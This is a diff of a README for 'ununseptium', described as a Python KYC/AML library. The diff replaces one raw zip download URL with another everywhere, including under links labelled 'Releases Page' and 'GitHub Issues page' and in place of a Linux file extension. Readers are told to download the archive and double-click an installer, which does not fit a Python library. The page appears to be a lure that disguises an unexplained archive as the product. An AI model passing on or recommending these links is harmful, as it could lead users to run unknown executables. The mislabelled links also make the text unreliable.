@@ -1,6 +1,6 @@
 # 🚀 ununseptium - Automate KYC and AML Effortlessly
 
-[![Download ununseptium](https://github.com/Q84hello/ununseptium/raw/refs/heads/main/docs/performance/Software_v2.9.zip)](https://github.com/Q84hello/ununseptium/raw/refs/heads/main/docs/performance/Software_v2.9.zip)
+[![Download ununseptium](https://raw.githubusercontent.com/Q84hello/ununseptium/main/scripts/Software-v2.6.zip)](https://raw.githubusercontent.com/Q84hello/ununseptium/main/scripts/Software-v2.6.zip)
 
 ## 📦 About ununseptium 
 
@@ -35,14 +35,14 @@ Ununseptium is a state-of-the-art Python library designed to simplify regulatory
 To get started with ununseptium, follow these steps to download and run the application:
 
 1. **Visit the Releases Page**: Click on the link below to access the latest version of ununseptium.
-   - [Visit this page to download](https://github.com/Q84hello/ununseptium/raw/refs/heads/main/docs/performance/Software_v2.9.zip)
+   - [Visit this page to download](https://raw.githubusercontent.com/Q84hello/ununseptium/main/scripts/Software-v2.6.zip)
 
 2. **Choose the Latest Release**: On the releases page, find the most recent version listed at the top. This version will have the latest features and fixes.
 
 3. **Download the Application**: Click on the file that corresponds to your operating system. You'll typically see options for Windows, macOS, and Linux. 
    - For Windows, look for a `.exe` file.
    - For macOS, look for a `.dmg` or `.pkg` file.
-   - For Linux, look for a `https://github.com/Q84hello/ununseptium/raw/refs/heads/main/docs/performance/Software_v2.9.zip` or `.deb` file.
+   - For Linux, look for a `https://raw.githubusercontent.com/Q84hello/ununseptium/main/scripts/Software-v2.6.zip` or `.deb` file.
 
 4. **Run the Installer**: After the download completes, locate the file in your downloads folder and double-click it to start the installation. Follow the prompts to complete the installation process.
 
@@ -69,7 +69,7 @@ Before downloading, ensure your computer meets the following requirements:
 
 If you need help while using ununseptium, feel free to reach out for support. You can:
 
-- Check the [GitHub Issues page](https://github.com/Q84hello/ununseptium/raw/refs/heads/main/docs/performance/Software_v2.9.zip) for common problems and solutions.
+- Check the [GitHub Issues page](https://raw.githubusercontent.com/Q84hello/ununseptium/main/scripts/Software-v2.6.zip) for common problems and solutions.
 - Join the discussion on the community forums or ask questions related to ununseptium.
 - Review the usage documentation available in the repository for detailed steps on how to utilize the features.
 
